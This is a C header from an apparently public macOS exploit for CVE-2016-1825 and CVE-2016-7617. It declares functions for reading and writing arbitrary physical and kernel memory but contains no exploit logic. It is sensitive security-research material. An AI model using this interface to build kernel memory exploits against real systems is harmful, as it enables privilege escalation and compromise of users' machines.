/*
 * physmem.h
 * Brandon Azad
 *
 * An exploit for CVE-2016-1825 and CVE-2016-7617 that allows reading and writing arbitrary
 * physical addresses on macOS.
 */
#ifndef PHYSMEM__PHYSMEM_H_
#define PHYSMEM__PHYSMEM_H_

#include <stdint.h>

/*
 * physmem_init
 *
 * Description:
 * 	Establish a connection to the user client we will use for phys_read and phys_write.
 */
void physmem_init(void);

/*
 * phys_read
 *
 * Description:
 * 	Read the width-byte integer at the given physical address.
 */
uint64_t phys_read(uint64_t paddr, unsigned width);

/*
 * phys_write
 *
 * Description:
 * 	Write the value as a width-byte integer to the given physical address.
 */
void phys_write(uint64_t paddr, uint64_t value, unsigned width);

/*
 * kern_read
 *
 * Description:
 * 	Read the width-byte integer at the given kernel address. If the address is not within the
 * 	kernel image, the result may not be accurate.
 */
uint64_t kern_read(uint64_t kaddr, unsigned width);

/*
 * kern_write
 *
 * Description:
 * 	Write the value as a width-byte integer to the given kernel address. If the address is not
 * 	within the kernel image, the data may be written to an arbitrary location.
 */
void kern_write(uint64_t kaddr, uint64_t value, unsigned width);

#endif
